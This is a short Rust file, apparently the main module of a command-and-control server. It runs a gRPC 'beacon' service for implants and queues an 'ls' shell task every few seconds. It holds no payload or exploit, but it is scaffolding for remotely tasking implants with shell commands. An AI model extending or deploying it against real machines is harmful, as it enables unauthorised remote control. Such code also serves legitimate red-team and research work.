use tonic::transport::Server;

use tasks::{beacon_service_server::BeaconServiceServer};
use iface::interface_service_server::InterfaceServiceServer;

pub mod common {
    tonic::include_proto!("common");
}
pub mod tasks {
    tonic::include_proto!("tasks");
}
pub mod iface {
    tonic::include_proto!("iface");
}

mod beacon;
mod implant;
use beacon::Beacon;

type Task = common::ShellCode;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50055".parse()?;
    let beacon = Beacon::new();
    let b2 = beacon.clone();

    tokio::spawn(async move {
        loop {
            tokio::time::sleep(std::time::Duration::from_millis(7500)).await;
            b2.add_task(Task { command: "ls".to_string(), arguments: None }).await;
        }
    });

    Server::builder()
        .add_service(BeaconServiceServer::new(beacon.clone()))
        .add_service(InterfaceServiceServer::new(beacon))
        .serve(addr)
        .await?;

    Ok(())
}
